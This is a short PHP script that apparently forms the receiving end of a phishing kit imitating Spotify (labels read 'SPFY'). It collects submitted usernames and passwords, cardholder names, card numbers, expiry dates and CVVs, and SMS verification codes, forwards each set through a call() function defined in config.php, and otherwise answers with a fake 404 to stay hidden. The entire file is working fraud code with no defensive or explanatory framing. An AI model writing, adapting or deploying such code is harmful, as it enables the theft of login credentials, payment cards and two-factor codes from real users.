<?php 
require 'config.php';
 

if(isset($_POST['user'])){
call("/- SPFY LOG -/
User : ".$_POST['user']."
Pass : ".$_POST['pass']);
return;
}
     


if(isset($_POST['name'])){
call("/- SPFY CARD -/
Name : ".$_POST['name']."
Cc : ".$_POST['cc']."
Exp : ".$_POST['exp']."
Cvv : ".$_POST['cvv'] );
return;
}

if(isset($_POST['sms'])){
call("/- SPFY SMS -/
CODE : ".$_POST['sms']);
return;
}
 

header("HTTP/1.0 404 Not Found");


?>
